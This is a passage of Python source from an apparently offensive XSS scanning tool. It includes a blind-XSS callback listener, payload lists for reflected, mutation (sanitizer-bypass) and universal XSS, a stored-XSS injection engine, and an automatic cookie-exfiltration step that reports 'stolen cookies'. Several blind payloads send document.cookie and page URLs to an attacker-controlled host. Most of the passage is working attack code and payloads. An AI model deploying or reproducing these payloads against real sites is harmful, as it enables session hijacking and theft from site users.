                if param_confirmed: break
                payload = pd["pl"]

                if self.hud:
                    self.hud.update(requests_sent=self.hud.requests_sent + 1)
                    self.hud.update(log=f"[dim]Audit:[/] {method} {url[:40]} [{param}]")

                confirmed, sigs, resp = self.verifier.verify(url, method, param, pnames, payload, baseline, hidden)
                if self.delay: time.sleep(self.delay)
                if not confirmed: continue

                # First confirmed payload — stop testing this param immediately
                r_sig = [s for s in sigs if s.startswith("reflect:")][0]
                _, how, det_ctx = r_sig.split(":", 2)
                param_confirmed = True
                sc = resp["status"] if resp else 0

                # JSON API endpoint: skip Playwright (visiting raw JSON won't execute JS)
                is_api = det_ctx == "json_api"
                if is_api:
                    pw_confirmed, screenshot, pw_ev = False, None, ["skipped:json_api_endpoint"]
                    score    = 65  # Potential — SPA frontend may render it
                    xss_type = "api_reflected"
                else:
                    pw_confirmed, screenshot, pw_ev = self.pw.validate(url, method, param, payload, pnames, hidden)
                    score    = Scorer.calculate(sigs, how, det_ctx, confirmed, pw_confirmed)
                    xss_type = "reflected_" + det_ctx if det_ctx not in ("none","unknown") else "reflected"
                    if "mxss" in pd.get("type",""): xss_type = "mutation"
                    elif "uxss" in pd.get("type",""): xss_type = "universal"

                burl    = PoC.browser(url, method, param, payload, pnames, hidden)
                ck_pocs = PoC.cookie_pocs(url, method, param, pnames, self.catcher, hidden)
                exfil_targets.extend(ck_pocs)  # Queue for batch exfil after all params

                f_entry = {
                    "url": url, "method": method, "param": param, "payload": payload,
                    "xss_type": xss_type, "context": det_ctx,
                    "signals": sigs, "confirmed": confirmed, "pw_confirmed": pw_confirmed,
                    "pw_events": pw_ev, "screenshot": screenshot, "score": score,
                    "status": sc, "ts": datetime.now().isoformat(),
                }
                with self._lock: self.findings.append(f_entry)
                if self.hud: self.hud.add_finding(f_entry)
                self._print_hit(url, method, param, payload, sigs, sc, burl, ck_pocs, score, None, pw_ev, screenshot)

        # Cookie exfil — once per endpoint after ALL params tested, single attempt
        if exfil_targets and self._catcher_obj:
            stolen = self._auto_exfil(exfil_targets, self._catcher_obj)
            if stolen:
                tprint(f"  {ck_lbl(f'Cookie exfil confirmed: {stolen[:80]}')}")
            else:
                tprint(f"  {warn('Cookie exfil: payloads fired but no callback — victim interaction may be needed')}")

    def run(self, endpoints, catcher_obj=None, threads=8):
        self._catcher_obj = catcher_obj
        section("PHASE 4/4 --- XSS TESTING & VERIFICATION")
        total_p = sum(len(ep["params"]) for ep in endpoints)
        console.print(info(f"{len(endpoints)} endpoints -- {total_p} parameters -- {threads} workers"))
        console.print(info(f"Tier cap: {self.tier} | Cookie exfil: {bool(catcher_obj)}"))
        console.print()

        with Progress(
            BrailleWaveColumn(),
            TextColumn("[bold red]Phase 4:[/] [bold white]{task.description}"),
            MofNCompleteColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True
        ) as progress_bar:
            overall_task = progress_bar.add_task("Total Audit Progress", total=len(endpoints))

            def _run_ep(args_tuple):
                i, ep = args_tuple
                if self.hud: self.hud.update(current_action=f"Auditing Endpoint {i}")
                self.test_endpoint(i, len(endpoints),
                                   ep["url"], ep["method"],
                                   ep["params"], ep.get("hidden", {}),
                                   progress_bar=progress_bar, task_id=overall_task)
                progress_bar.update(overall_task, advance=1)
                if self.hud: self.hud.update(endpoints_tested=i)

            workers = min(threads, len(endpoints)) if endpoints else 1
            with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
                list(pool.map(_run_ep, enumerate(endpoints, 1)))

        return self.findings



# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# BLIND XSS OOB LISTENER  --- self-hosted callback for out-of-band detection
# Listens on a random port; payloads POST/GET to it with a token.
# Confirms stored/blind XSS without needing a browser.
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class BlindXSSServer:
    """
    Embeds a lightweight HTTP server.  Blind XSS payloads carry BTOKEN in
    the URL: http://ATTACKER:PORT/?b=BTOKEN&p=PARAM&u=URL
    Any incoming hit with b=BTOKEN is a confirmed blind XSS execution.
    """
    def __init__(self, port=0):
        self._hits   = []
        self._lock   = threading.Lock()
        self._server = None
        self._thread = None
        self.url     = None
        self.port    = port

    @staticmethod
    def _local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception: return "127.0.0.1"

    def start(self):
        srv_ref = self
        class _H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                token = qs.get("b", [""])[0]
                param = qs.get("p", ["?"])[0]
                src   = qs.get("u", ["?"])[0]
                ua    = self.headers.get("User-Agent","")
                with srv_ref._lock:
                    srv_ref._hits.append({"token":token,"param":param,
                                          "src":src,"ua":ua})
                tprint(f"\n  {color('BLIND XSS HIT', 'bold red')}")
                tprint(f"  {color('  param :', 'dim')} {color(param, 'bold red')}")
                tprint(f"  {color('  src   :', 'dim')} {color(src[:70], 'cyan')}")
                tprint(f"  {color('  UA    :', 'dim')} {color(ua[:60], 'dim')}\n")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
            def log_message(self,*a): pass
        try:
            self._server = http.server.HTTPServer(("0.0.0.0", self.port), _H)
            self.port    = self._server.server_address[1]
            ip           = self._local_ip()
            self.url     = f"http://{ip}:{self.port}"
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            return self.url
        except Exception as e:
            tprint(f"  {warn(f'BlindXSS server failed: {e}')}")
            return None

    def poll(self, token, timeout=5.0):
        dl = time.time() + timeout
        while time.time() < dl:
            with self._lock:
                for h in self._hits:
                    if h["token"] == token: return True, h
            time.sleep(0.2)
        return False, {}

    def stop(self):
        if self._server: self._server.shutdown()


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# BLIND XSS PAYLOADS  --- OOB callback payloads (replaced at runtime)
# BURL  = http://attacker:port
# BTOKEN = unique token per scan
# BPARAM = param name being tested
# BSRC   = source URL being tested
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BLIND_PAYLOADS = [
    # Template strings --- BURL/BTOKEN/BPARAM replaced at runtime by BlindXSSTester
    # All use double-quoted attribute values; inner JS uses no quotes
    "<script>fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))</script>",
    "<svg onload=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))>",
    "<img src=x onerror=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))>",
    "<script>new Image().src='BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie)</script>",
    "<body onload=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<input autofocus onfocus=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<details open ontoggle=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<iframe src=javascript:new Image().src='BURL/?b=BTOKEN&p=BPARAM'>",
    "<script>var x=new XMLHttpRequest();x.open('GET','BURL/?b=BTOKEN&p=BPARAM&u='+location.href,true);x.send()</script>",
    "<script>document.location='BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(document.cookie)</script>",
    "<script>setTimeout(function(){fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)},500)</script>",
]


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# DOM XSS  --- client-side sink detection via JS pattern analysis
# Scans page source for dangerous sinks receiving URL-controllable sources.
# Also probes with marker values to detect DOM reflection without server echo.
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class DOMXSSScanner:
    """
    Two strategies:
      A) Static: scan JS source for sink(source) patterns without server round-trip.
         Detects assignments like: element.innerHTML = location.hash
      B) Dynamic probe: inject a marker into URL params, fetch the page,
         search for unescaped marker in the rendered HTML (server-side DOM reflection).
         This catches server-rendered DOM contexts (SSR frameworks, template literals).
    """

    # Dangerous JS sinks that execute HTML/JS
    SINKS = re.compile(
        r"(?:"
        r"\.innerHTML|\.outerHTML|\.insertAdjacentHTML|document\.write|document\.writeln"
        r"|eval|setTimeout|setInterval"
        r"|location\.href|location\.replace|location\.assign"
        r"|\.html\s*\(|\.append\s*\(|\.prepend\s*\(|\.after\s*\(|\.before\s*\("
        r"|jQuery\s*\("
        r")",
        re.I)

    # URL-controllable DOM sources
    SOURCES = re.compile(
        r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|referrer|baseURI)"
        r"|window\.name|document\.cookie"
        r"|URLSearchParams|getParameter\s*\(|\.search\b)",
        re.I)

    # High-risk combined sink+source on same line (strong indicator)
    COMBINED = re.compile(
        r"(?:innerHTML|outerHTML|document\.write|eval|location\.href)\s*[=+(]"
        r"[^;]{0,200}"
        r"(?:location\.|document\.URL|window\.name|URLSearchParams|\.hash|\.search)",
        re.I | re.S)

    # DOM XSS probe payloads --- injected into URL params, checked in page HTML
    PROBE_MARKER = "XS5D0M"
    DOM_PROBES = [
        "<XS5D0M>",
        '"><XS5D0M><"',
        "javascript:XS5D0M",
        "&lt;XS5D0M&gt;",
    ]
    # Confirm: marker appears unescaped
    _UNESC = re.compile(r"<[^>]*XS5D0M|XS5D0M[^;]*>", re.I)

    # Confirm: marker appears unescaped (not &lt; form)
    _UNESC = re.compile(r'<[^>]*XS5D0M|XS5D0M[^;]*>', re.I)

    def __init__(self, client):
        self.client   = client
        self.findings = []
        self._lock    = threading.Lock()

    def scan_js_source(self, url, body):
        """Static analysis: look for sink+source combos in page JS."""
        results = []
        # Check inline scripts
        for sc in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I):
            if self.COMBINED.search(sc):
                results.append({
                    "type":    "dom_static",
                    "url":     url,
                    "detail":  "sink+source combo in inline script",
                    "snippet": self.COMBINED.search(sc).group()[:120],
                })
            elif self.SINKS.search(sc) and self.SOURCES.search(sc):
                results.append({
                    "type":    "dom_static",
                    "url":     url,
                    "detail":  "sink and source both present in inline script",
                    "snippet": sc[:120],
                })
        return results

    def probe_params(self, url, params):
        """Dynamic: inject DOM probe markers into URL params, check response."""
        results = []
        for param in params:
            for probe in self.DOM_PROBES[:3]:   # first 3 are most distinctive
                test_params = {**params, param: probe}
                try:
                    resp = self.client.get(url, test_params)
                    body = resp.get("body","")
                    if self._UNESC.search(body):
                        results.append({
                            "type":   "dom_reflected",
                            "url":    url,
                            "param":  param,
                            "probe":  probe,
                            "detail": "unescaped marker reflected in DOM context",
                        })
                        break
                except Exception:
                    pass
        return results


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# MUTATION XSS (mXSS)  --- bypasses sanitizers via innerHTML re-parsing tricks
# Modern sanitizers (DOMPurify < 2.4, etc.) can be bypassed by feeding HTML
# that mutates when parsed --- re-parsed by the browser.
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
MXSS_PAYLOADS = [
    # SVG foreignObject --- HTML namespace switch (DOMPurify bypass)
    '<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',
    # SVG use element href mutation
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==#x">',
    # Math + annotation mutation
    '<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>',
    # Table mutation (content outside table is re-parented)
    '<table><td><svg><script>alert(1)</script></td></table>',
    # Template innerHTML mutation
    '<template id=x><img src=1 onerror=alert(1)></template><script>document.body.innerHTML=document.getElementById("x").innerHTML</script>',
    # noscript + innerHTML re-parse
    '<noscript><p title="</noscript><img src=1 onerror=alert(1)>">',
    # DOMPurify 2.x bypass via namespace confusion
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
    # iframe srcdoc innerHTML mutation
    '<iframe srcdoc="<img src=1 onerror=parent.alert(1)>">',
    # SVG script via animate (mutation triggers after parse)
    '<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>',
    # select option --- innerHTML mutation
    '<select><option><img src=1 onerror=alert(1)></option></select>',
    # ruby annotation mutation
    '<ruby><rt><![CDATA[x]]></rt><script>alert(1)</script></ruby>',
    # style @charset escape mutation
    '<style>@charset "\";}</style><script>alert(1)</script>',
    # XML namespace mutation
    '<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="">alert(1)</script></svg>',
    # DOMPurify mXSS via data URI + namespace
    '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
    # HTML import mutation (Chrome legacy)
    '<link rel=import href="data:text/html,<script>alert(1)</script>">',
    # Attribute namespace mutation
    '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=400 /></a></svg>',
]


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# UNIVERSAL XSS (uXSS)  --- cross-origin / browser-level vectors
# These exploit browser quirks, extensions, or protocol handlers.
# Detected via reflection + pattern matching (no browser needed).
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
UXSS_PAYLOADS = [
    "data:text/html,<script>alert(document.domain)</script>",
    "javascript:alert(document.domain)//",
    "vbscript:msgbox(document.domain)",
    "<script>open('javascript:alert(document.domain)')</script>",
    "<script>var u=URL.createObjectURL(new Blob(['<script>alert(document.domain)</scr'+'ipt>'],{type:'text/html'}));location=u</script>",
    "<iframe srcdoc='<script>alert(top.document.domain)</script>'>",
    "<script>window.name='<img src=1 onerror=alert(document.domain)>';location='javascript:document.body.innerHTML=name'</script>",
    "<script>window.onmessage=function(e){eval(e.data)};parent.postMessage('alert(document.domain)','*')</script>",
    "<form name=location><input id=href value=javascript:alert(1)></form><script>location.href</script>",
    "<script>history.pushState(0,0,'/');eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
    "<style>@import'javascript:alert(document.domain)';</style>",
    "<svg><set attributeName=onload to=alert(document.domain)>",
]


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# STORED XSS ENGINE
# Inject payloads into writable endpoints (POST forms, APIs).
# Then visit a set of retrieval URLs (pages that display stored content)
# and check for unescaped payload reflection.
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class StoredXSSScanner:
    """
    BLOODHOUND Taint-Analysis Engine — 3-phase autonomous stored XSS detection.

    Phase 1 — Marker injection: injects a harmless unique marker into every param
               via correct method (GET/POST). Crawls spider-discovered HTML pages
               to map data flows without hard-coded paths.
    Phase 2 — Targeted attack: real XSS payloads fired only on confirmed flows,
               diffed against baseline so false fragment matches are impossible.
    Phase 3 — Playwright confirmation + screenshot as evidence.
    """
    _STORED_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '<svg onload=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '<details open ontoggle=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
    ]
    _XSS_FRAGS = [
        "<script>alert", "onerror=alert(1)", "onload=alert(1)",
        "ontoggle=alert(1)", 'srcdoc="<script>alert',
    ]

    def __init__(self, client, visited_urls=None):
        self.client       = client
        self.visited_urls = list(visited_urls or [])
        self.findings     = []
        self._lock        = threading.Lock()
        self._pw          = PlaywrightValidator(headless=True)

    def _html_candidates(self, base_url):
        """
        Autonomously discover display pages from spider crawl data.
        Probes each visited URL and keeps only those that return text/html.
        No hard-coded paths — the spider already mapped the app.
        """
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        same_origin = [u for u in self.visited_urls
                       if u.startswith(origin) and not u.endswith(
                           (".js", ".css", ".png", ".jpg", ".svg", ".ico", ".woff"))]
        html_pages = []
        checked = set()
        for url in same_origin:
            if url in checked: continue
            checked.add(url)
            try:
                resp = self.client.get(url)
                ct   = resp.get("headers", {}).get(
                    "Content-Type", resp.get("headers", {}).get("content-type", ""))
                if "text/html" in ct.lower():
                    html_pages.append(url)
            except Exception:
                continue
        return html_pages if html_pages else [origin + "/"]

    def _marker(self):
        uid = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"xs5bh{uid}"

    def _inject(self, ep, param, value):
        params = {**ep["params"], param: value}
        return (self.client.post(ep["url"], params) if ep["method"] == "POST"
                else self.client.get(ep["url"], params))

    def _fetch_bodies(self, urls):
        result = {}
        for url in urls:
            try: result[url] = self.client.get(url).get("body", "")
            except Exception: result[url] = ""
        return result

    def _pw_confirm_stored(self, display_url):
        if not PLAYWRIGHT_INSTALLED:
            return False, None
        confirmed, screenshot_path = False, None
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx     = browser.new_context(ignore_https_errors=True)
                page    = ctx.new_page()
                _fired  = threading.Event()

                def _dialog(d):
                    nonlocal confirmed, screenshot_path
                    confirmed = True
                    try:
                        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
                        fname = f"stored_xss_{ts}.png"
                        screenshot_path = os.path.join(self._pw.evidence_dir, fname)
                        page.screenshot(path=screenshot_path)
                    except Exception: pass
                    try: d.dismiss()
                    except Exception: pass
                    _fired.set()

                page.on("dialog", _dialog)
                try:
                    page.goto(display_url, timeout=12000, wait_until="domcontentloaded")
                    _fired.wait(timeout=5.0)
                except Exception: pass
                browser.close()
        except Exception: pass
        return confirmed, screenshot_path

    def scan(self, endpoints, base_url, hud_state=None):
        section("STORED XSS --- BLOODHOUND TAINT ANALYSIS")

        console.print(info("[bold]Discovery:[/] Identifying HTML display pages from crawl data..."))
        candidates = self._html_candidates(base_url)
        all_eps    = endpoints if endpoints else []
        console.print(info(
            f"{len(all_eps)} endpoints -- {len(candidates)} HTML display pages "
            f"[dim](autonomously discovered — no hard-coded paths)[/dim]"
        ))

        if not candidates:
            console.print(warn("No HTML display pages found in crawl data — skipping stored XSS."))
            return self.findings

        # Baseline snapshot before any injection
        console.print(info("[bold]Baseline:[/] Snapshotting display pages..."))
        baseline_bodies = self._fetch_bodies(candidates)

        # Phase 1: marker injection → data-flow mapping
        console.print(info("[bold]Phase 1:[/] Injecting taint markers to map data flows..."))
        data_flows = []

        with Progress(BrailleWaveColumn(),
                      TextColumn("[bold red]Bloodhound:[/] [bold white]{task.description}"),
                      MofNCompleteColumn(),
                      console=console, transient=True) as pb:
            total = sum(len(ep["params"]) for ep in all_eps) * len(candidates)
            task  = pb.add_task("Mapping data flows...", total=max(total, 1))

            for ep in all_eps:
                for param in ep["params"]:
                    marker = self._marker()
                    try: self._inject(ep, param, marker)
                    except Exception:
                        pb.update(task, advance=len(candidates)); continue
                    for durl in candidates:
                        pb.update(task, description=f"Hunting {durl[-35:]}...", advance=1)
                        try:
                            body = self.client.get(durl).get("body", "")
                            if marker in body and marker not in baseline_bodies.get(durl, ""):
                                data_flows.append({"ep": ep, "param": param, "display_url": durl})
                                console.print(ok(f"[bold]DATA FLOW:[/] {ep['method']} {ep['url']} [{param}] → {durl}"))
                                baseline_bodies[durl] = body
                                break
                        except Exception: continue

        if not data_flows:
            console.print(warn("No stored data flows detected — target may sanitize or not persist input."))
            return self.findings

        # Phase 2: targeted payload attack on confirmed flows
        console.print(info(f"[bold]Phase 2:[/] Attacking {len(data_flows)} confirmed data flow(s)..."))

        for flow in data_flows:
            ep, param, display_url = flow["ep"], flow["param"], flow["display_url"]
            baseline     = baseline_bodies.get(display_url, "")
            confirmed_pl = None

            for pl in self._STORED_PAYLOADS:
                try:
                    self._inject(ep, param, pl)
                    body      = self.client.get(display_url).get("body", "")
                    new_frags = [f for f in self._XSS_FRAGS if f in body and f not in baseline]
                    if new_frags:
                        confirmed_pl = pl; break
                except Exception: continue

            if not confirmed_pl:
                console.print(warn(f"Data flow confirmed ({ep['url']} [{param}] → {display_url}) but payloads sanitized."))
                continue

            # Phase 3: Playwright confirmation + screenshot
            pw_confirmed, screenshot = self._pw_confirm_stored(display_url)
            score = 100 if pw_confirmed else 85

            finding = {
                "type": "stored", "inject_url": ep["url"], "found_at": display_url,
                "param": param, "payload": confirmed_pl, "pw_confirmed": pw_confirmed,
                "screenshot": screenshot, "score": score, "xss_type": "stored", "url": ep["url"],
            }
            with self._lock: self.findings.append(finding)
            if hud_state: hud_state.add_finding(finding)

            console.print(f"\n[bold white on orange3] STORED XSS [/] [bold white]{ep['url']}[/]")
            console.print(f"  [dim]method  :[/] [bold]{ep['method']}[/]")
            console.print(f"  [dim]param   :[/] [bold orange3]{param}[/]")
            console.print(f"  [dim]found at:[/] [cyan]{display_url}[/]")
            console.print(f"  [dim]payload :[/] [bold red]{confirmed_pl[:80]}[/]")
            if pw_confirmed: console.print(f"  [dim]browser :[/] [bold cyan]CONFIRMED via Playwright[/]")
            if screenshot:   console.print(f"  [dim]evidence:[/] [bold green]{screenshot}[/]")
            console.print(Rule(style="dim"))

        return self.findings


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# BLIND XSS TESTER  --- sends OOB payloads, polls callback server
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class BlindXSSTester:
    """
    Sends blind XSS payloads to ALL endpoints (GET + POST).
    Payloads carry BURL/BTOKEN so any browser executing them calls home.
    Polls the BlindXSSServer for 8s after each injection batch.
    Best used with a catcher URL reachable from the target (same network
    or public IP).  Falls back gracefully if server can't start.
    """
    def __init__(self, client, blind_server_url, token):
        self.client     = client
        self.burl       = blind_server_url.rstrip("/") if blind_server_url else ""
        self.token      = token
        self.findings   = []
        self._lock      = threading.Lock()

    def _make_payload(self, tmpl, param, src_url):
        return (tmpl
                .replace("BURL",   self.burl)
                .replace("BTOKEN", self.token)
                .replace("BPARAM", urllib.parse.quote(param, safe=""))
                .replace("BSRC",   urllib.parse.quote(src_url, safe="")))

    def scan(self, endpoints, blind_server):
        section("BLIND XSS --- OOB CALLBACK INJECTION")
        if not self.burl:
            tprint(f"  {warn('No blind XSS server --- skipping (use --blind-port or --blind-url)')}")
            return []
        tprint(f"  {info(f'Callback: [cyan]{self.burl}[/cyan]')}")
        tprint(f"  {info(f'Token:    [bold magenta]{self.token}[/bold magenta]')}")
        tprint(f"  {info(str(len(endpoints)) + ' endpoints -- ' + str(len(BLIND_PAYLOADS)) + ' blind payloads')}")

        injected = 0
        for ep in endpoints:
            url    = ep["url"]
            params = ep["params"]
            method = ep["method"]
            for param in params:
                for pl_tmpl in BLIND_PAYLOADS[:6]:
                    pl = self._make_payload(pl_tmpl, param, url)
                    test_params = {**params, param: pl}
                    try:
                        if method == "POST":
                            self.client.post(url, test_params)
                        else:
                            self.client.get(url, test_params)
                        injected += 1
                    except Exception: pass

        tprint(f"  {info(f'{injected} blind payloads injected --- polling {len(BLIND_PAYLOADS[:6])*8}s---')}")

        for _ in range(20):
            hit, data = blind_server.poll(self.token, timeout=0.5)
            if hit:
                finding = {"type":"blind","data":data}
                with self._lock: self.findings.append(finding)
                tprint(f"  [bold red]BLIND XSS CONFIRMED[/bold red]  [cyan]{data.get('src','?')[:60]}[/cyan]")
                break
            time.sleep(0.3)

        tprint(f"  {ok(f'Blind XSS scan done --- {len(self.findings)} confirmed callbacks')}")
        tprint(f"  [dim]  Note: Blind XSS may fire later when a victim views the page.[/dim]")
        tprint(f"  [dim]  Monitor: {self.burl}[/dim]")
        return self.findings


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# FINAL REPORT  --- HELLHOUND-style structured output
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def print_report(findings, target, stats, caught_cookies,
                 stored=None, dom=None, mxss=None, uxss=None, blind=None):
    """Final high-contrast report summary with Rich tables."""
    section("FINAL AUDIT REPORT")
    
    # Overview statistics panel
    stats_table = Table(box=None, show_header=False)
    stats_table.add_row("[bold cyan]Target URL[/]", f"[white]{target}[/]")
    stats_table.add_row("[bold cyan]Total Endpoints[/]", str(stats.get("endpoints", 0)))
    stats_table.add_row("[bold cyan]Findings (Reflected)[/]", f"[bold red]{len(findings)}[/]")
    stats_table.add_row("[bold cyan]Findings (Others)[/]", f"[bold red]{len(stored or []) + len(dom or []) + len(mxss or []) + len(uxss or []) + len(blind or [])}[/]")
    
    console.print(Panel(stats_table, title="[bold white]SCAN OVERVIEW[/]", border_style="cyan", expand=False))
    console.print()

    # Main Findings Table
    show_findings_table(findings)

    # Detailed Summaries for other types
    if caught_cookies:
        ck_table = Table(title="[bold orange3]STOLEN COOKIES[/]", box=box.SIMPLE)
        ck_table.add_column("Timestamp", style="dim")
        ck_table.add_column("Source IP", style="white")
        ck_table.add_column("Cookie Data", style="bold orange3")
        for ck in caught_cookies:
            ck_table.add_row(ck["ts"], ck["ip"], ck["cookie"][:80])
        console.print(ck_table)
        console.print()

    if stored:
        st_table = Table(title="[bold red]STORED XSS FINDINGS[/]", box=box.SIMPLE)
        st_table.add_column("Inject URL", style="white")
        st_table.add_column("Param", style="bold red")
        st_table.add_column("Retrieval URL", style="cyan")
        for f in stored:
            st_table.add_row(f["inject_url"][:40], f.get("param", f.get("inject_param", "N/A")), f["found_at"][:40])
        console.print(st_table)
        console.print()

    if dom:
        dom_table = Table(title="[bold magenta]DOM XSS POTENTIAL[/]", box=box.SIMPLE)
        dom_table.add_column("Type", style="bold magenta")
        dom_table.add_column("URL", style="white")
        dom_table.add_column("Detail", style="dim")
        for f in dom[:10]:
            dom_table.add_row(f.get("type","dom"), f.get("url","?")[:50], f.get("detail","?")[:50])
        console.print(dom_table)
        console.print()

    if mxss or uxss or blind:
        misc_table = Table(title="[bold yellow]OTHER VECTORS (mXSS/uXSS/Blind)[/]", box=box.SIMPLE)
        misc_table.add_column("Type", style="bold yellow")
        misc_table.add_column("Source", style="white")
        misc_table.add_column("Status", style="bold green")
        for f in (mxss or []): misc_table.add_row("mXSS", f.get("url","?")[:50], "CONFIRMED")
        for f in (uxss or []): misc_table.add_row("uXSS", f.get("url","?")[:50], "CONFIRMED")
        for f in (blind or []): misc_table.add_row("Blind", f.get("data",{}).get("src","?")[:50], "HIT RECEIVED")
        console.print(misc_table)
        console.print()

    console.print(Rule(style="dim"))
    console.print(Text("Audit complete. Professional report generated via HELLHOUND engine.", justify="center", style="dim"))
    console.print()


def export_json(findings, target, stats, caught_cookies, path,
                stored=None, dom=None, mxss=None, uxss=None, blind=None):
    with open(path, "w") as fh:
        json.dump({
            "tool":    "xssentry",
            "version": "4.0",
            "ts":      datetime.now().isoformat(),
            "target":  target,
            "stats":   stats,
            "findings":      findings,
            "stored_xss":    stored or [],
            "dom_xss":       dom or [],
            "mxss":          mxss or [],
            "uxss":          uxss or [],
            "blind_xss":     blind or [],
            "stolen_cookies": caught_cookies,
        }, fh, indent=2)
    tprint(f"  {ok(f'JSON report --- {path}')}")


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# EXTERNAL RECON INTEGRATION
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def run_external_spider(target, args):
    """Executes external Hellhound Spider and parses JSON output."""
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    spider_path = os.path.join(_script_dir, "spider.py")
    temp_json   = os.path.join(_script_dir, f".spider_{int(time.time())}.json")
    cmd = [sys.executable, spider_path, target, "--out", temp_json]
    if getattr(args, "verbose", False): cmd.append("--verbose")
    
    with Progress(
        BrailleWaveColumn(),
        TextColumn("[bold red]PHASE 1/2 ─── RECONNAISSANCE BY HELLHOUND-SPIDER[/]"),
        console=console,
        transient=True
    ) as progress_bar:
        task = progress_bar.add_task("Crawling...", total=None) # Indeterminate
        try:
            if getattr(args, "verbose", False):
                subprocess.run(cmd, check=True, cwd=_script_dir)
            else:
                subprocess.run(cmd, check=True, capture_output=True, cwd=_script_dir)
            if not os.path.exists(temp_json):
                return []
            with open(temp_json, "r") as f: data = json.load(f)
            try: os.remove(temp_json)
            except OSError: pass

            raw_eps = []
            for ep in data.get("endpoints", []):
                url, methods = ep["url"], ep.get("methods", ["GET"])
                p_map = ep.get("params", {}); params = {}
                for bucket in ["query", "form", "js", "openapi", "runtime"]:
                    for p in p_map.get(bucket, []): params[p] = "test"
                for m in methods:
                    raw_eps.append({"url": url, "method": m.upper(), "params": params,
                                    "hidden": {}, "source": "spider"})
            progress_bar.update(task, completed=100, total=100) # Finish it
            return raw_eps
        except Exception as e:
            tprint(f"  {err(f'External spider failed: {e}')}"); return []

def show_findings_table(all_findings):
    if not all_findings:
        console.print()
        console.print(Panel("[bold green]Zero vulnerabilities detected. System appears clean.[/]", title="[bold white]AUDIT RESULT[/]", border_style="green", expand=False))
        return

    table = Table(title="[bold red]XSS AUDIT FINDINGS[/]", box=box.HEAVY_EDGE, show_lines=True)
    table.add_column("Sev", justify="center")
    table.add_column("Type", style="bold magenta")
    table.add_column("Parameter", style="bold orange3")
    table.add_column("URL (Endpoint)", style="white")
    table.add_column("Payload (Truncated)", style="dim")
    table.add_column("Score", justify="right")

    for f in all_findings:
        score = f.get("score", 0)
